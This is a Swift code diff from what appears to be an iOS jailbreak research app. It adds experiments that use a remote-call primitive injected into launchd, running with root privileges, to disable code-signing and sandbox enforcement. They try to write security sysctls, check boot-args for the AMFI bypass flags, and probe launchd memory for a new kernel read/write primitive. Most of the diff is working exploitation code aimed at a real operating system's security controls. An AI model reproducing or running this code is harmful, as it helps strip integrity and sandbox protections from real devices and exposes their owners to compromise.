@@ -386,11 +386,37 @@ struct AMFIExperimentView: View {
             ))
             
             // ============================================
-            // 🔥 Experiment 42: SAFE READ of cs_enforcement candidate
-            // Only READ — no write! Verify address is accessible first.
+            // 🔥 Experiment 42: SAFE READ — DISABLED (panic, wrong zone)
+            // cs_enforcement_disable is in zone not accessible via socket KRW
             // ============================================
-            let exp42 = self.expSafeReadCSVar(rc: rc)
-            experimentResults.append(exp42)
+            experimentResults.append(ExperimentResult(
+                name: "🔥 cs_var read (DISABLED)",
+                success: false,
+                detail: "⚠️ Disabled — address 0xfffffff00a3304e8 in inaccessible zone.\nSocket KRW can only access: proc, task, socket PCBs.\nNeed NEW KRW primitive to access other zones.",
+                timestamp: Date()
+            ))
+            
+            // ============================================
+            // Experiment 43: sysctl approach — find CS-related sysctls
+            // Some sysctls directly control kernel behavior!
+            // ============================================
+            let exp43 = self.expSysctlApproach(rc: rc)
+            experimentResults.append(exp43)
+            
+            // ============================================
+            // Experiment 44: NVRAM boot-args approach
+            // If we can write cs_enforcement_disable=1 to NVRAM...
+            // ============================================
+            let exp44 = self.expNVRAMApproach(rc: rc)
+            experimentResults.append(exp44)
+            
+            // ============================================
+            // Experiment 45: RemoteCall memory read as new KRW
+            // launchd can read ANY memory in its address space
+            // Kernel maps some zones into launchd's space!
+            // ============================================
+            let exp45 = self.expRCMemoryAccess(rc: rc)
+            experimentResults.append(exp45)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -2573,6 +2599,174 @@ struct AMFIExperimentView: View {
         }
         
         return ExperimentResult(name: "🔥🔥 CS_ENFORCEMENT_DISABLE", success: afterVal == 1 && currentVal != 1, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - New Vulnerability Research
+    
+    /// Sysctl approach: find and use CS-related sysctls
+    /// Some sysctls can directly modify kernel state without KRW!
+    private func expSysctlApproach(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        var detail = "Searching for CS-related sysctls...\n\n"
+        
+        // Try reading known security sysctls
+        let sysctls = [
+            "security.mac.proc_enforce",
+            "security.mac.vnode_enforce",
+            "vm.cs_enforcement_disable",
+            "vm.cs_force_kill",
+            "vm.cs_force_hard",
+            "vm.cs_debug",
+            "kern.cs_enforcement_disable",
+            "security.mac.sandbox.enforce",
+        ]
+        
+        for name in sysctls {
+            let nameAddr = remote_alloc_str(rc, name)
+            let valAddr = mem + 0x1A00
+            let sizeAddr = mem + 0x1A08
+            
+            // Set size to 4 (int)
+            rc[sizeAddr].setValue64(4)
+            rc[valAddr].setValue32(0xDEAD)
+            
+            // sysctlbyname(name, &val, &size, NULL, 0)
+            let ret = RootExecutor.rcall(rc, "sysctlbyname", nameAddr, valAddr, sizeAddr, 0, 0)
+            let val = rc[valAddr].value32()
+            let size = rc[sizeAddr].value64()
+            
+            if ret == 0 && val != 0xDEAD {
+                detail += "✅ \(name) = \(val) (size=\(size))\n"
+            } else if ret == 0 {
+                detail += "  \(name) = (read ok, val unchanged)\n"
+            } else {
+                // Try errno
+                let err = remote_errno(rc)
+                if err == 2 { // ENOENT
+                    detail += "  \(name) — not found\n"
+                } else {
+                    detail += "  \(name) — error \(err)\n"
+                }
+            }
+            
+            RootExecutor.rcall(rc, "free", nameAddr)
+        }
+        
+        // Try WRITING to vm.cs_enforcement_disable (if it exists)
+        detail += "\nTrying to WRITE sysctls...\n"
+        let writeTargets = ["vm.cs_enforcement_disable", "security.mac.proc_enforce", "security.mac.vnode_enforce"]
+        
+        for name in writeTargets {
+            let nameAddr = remote_alloc_str(rc, name)
+            let valAddr = mem + 0x1A00
+            rc[valAddr].setValue32(1) // try setting to 1
+            
+            // sysctlbyname(name, NULL, NULL, &newval, sizeof(int))
+            let ret = RootExecutor.rcall(rc, "sysctlbyname", nameAddr, 0, 0, valAddr, 4)
+            
+            if ret == 0 {
+                detail += "✅ WROTE \(name) = 1 SUCCESS!\n"
+            } else {
+                let err = remote_errno(rc)
+                detail += "  \(name) write failed (err=\(err))\n"
+            }
+            
+            RootExecutor.rcall(rc, "free", nameAddr)
+        }
+        
+        let hasSuccess = detail.contains("✅")
+        return ExperimentResult(name: "sysctl CS variables", success: hasSuccess, detail: detail, timestamp: Date())
+    }
+    
+    /// NVRAM approach: write boot-args to disable CS enforcement
+    /// IOKit NVRAM access from root context
+    private func expNVRAMApproach(rc: RemoteCall) -> ExperimentResult {
+        var detail = "NVRAM boot-args approach\n\n"
+        
+        // Try to read current boot-args via sysctlbyname
+        let mem = rc.trojanMem
+        let nameAddr = remote_alloc_str(rc, "kern.bootargs")
+        let bufAddr = mem + 0x1800
+        let sizeAddr = mem + 0x1A08
+        rc[sizeAddr].setValue64(256)
+        
+        let ret = RootExecutor.rcall(rc, "sysctlbyname", nameAddr, bufAddr, sizeAddr, 0, 0)
+        
+        if ret == 0 {
+            let size = rc[sizeAddr].value64()
+            if size > 0 && size < 256 {
+                var buf = [UInt8](repeating: 0, count: Int(size))
+                rc.remoteRead(bufAddr, to: &buf, size: size)
+                let bootargs = String(bytes: buf, encoding: .utf8) ?? "(binary)"
+                detail += "Current boot-args: '\(bootargs)'\n\n"
+                
+                if bootargs.contains("cs_enforcement_disable") {
+                    detail += "✅ cs_enforcement_disable ALREADY in boot-args!\n"
+                } else if bootargs.contains("amfi_get_out_of_my_way") {
+                    detail += "✅ amfi_get_out_of_my_way in boot-args!\n"
+                } else {
+                    detail += "No CS disable flags in boot-args\n"
+                    detail += "Would need NVRAM write to add them\n"
+                }
+            }
+        } else {
+            detail += "Cannot read boot-args (ret=\(ret))\n"
+        }
+        
+        RootExecutor.rcall(rc, "free", nameAddr)
+        
+        // Try to access NVRAM via IOKit (if available)
+        detail += "\nNVRAM write would require IOKit (not loaded in launchd)\n"
+        detail += "Alternative: use nvram command if accessible\n"
+        
+        return ExperimentResult(name: "NVRAM boot-args", success: detail.contains("✅"), detail: detail, timestamp: Date())
+    }
+    
+    /// Use RemoteCall's own memory access as alternative KRW
+    /// launchd's address space might have kernel mappings we can exploit
+    private func expRCMemoryAccess(rc: RemoteCall) -> ExperimentResult {
+        var detail = "Testing RemoteCall memory access range\n\n"
+        
+        // RemoteCall can read/write launchd's virtual address space
+        // Question: is there any kernel memory mapped into launchd?
+        // commpage is at 0xfffffff0... but that's kernel VA
+        // launchd has its own VA space (0x1XXXXX...)
+        
+        // Test: what's at high addresses in launchd's space?
+        // ARM64 user space is typically 0x0 - 0x1000000000 (64GB)
+        // Anything above might be kernel mapping
+        
+        let testAddrs: [(String, UInt64)] = [
+            ("trojanMem", rc.trojanMem),
+            ("trojanMem page", rc.trojanMem & ~0x3FFF),
+            ("commpage (0x1FC000000)", 0x00000001FC000000),
+            ("high user (0x200000000)", 0x0000000200000000),
+        ]
+        
+        for (name, addr) in testAddrs {
+            var buf = [UInt8](repeating: 0, count: 8)
+            let ok = rc.remoteRead(addr, to: &buf, size: 8)
+            let val = buf.withUnsafeBytes { $0.load(as: UInt64.self) }
+            detail += "\(name) (0x\(String(format: "%llx", addr))): "
+            detail += ok ? "0x\(String(format: "%016llx", val))\n" : "FAILED\n"
+        }
+        
+        // Check commpage for useful info
+        // iOS commpage at 0x1FC000000 contains system info
+        let commpageAddr: UInt64 = 0x00000001FC000000
+        var commpageBuf = [UInt8](repeating: 0, count: 64)
+        let cpOk = rc.remoteRead(commpageAddr, to: &commpageBuf, size: 64)
+        
+        if cpOk {
+            detail += "\nCommpage accessible! First 64 bytes:\n"
+            let hex = commpageBuf.prefix(32).map { String(format: "%02x", $0) }.joined(separator: " ")
+            detail += "  \(hex)\n"
+            detail += "\nCommpage might contain kernel pointers we can use!\n"
+        } else {
+            detail += "\nCommpage not accessible from launchd\n"
+        }
+        
+        return ExperimentResult(name: "RC memory access range", success: cpOk, detail: detail, timestamp: Date())
     }
     
     /// Spawn from SpringBoard context instead of launchd
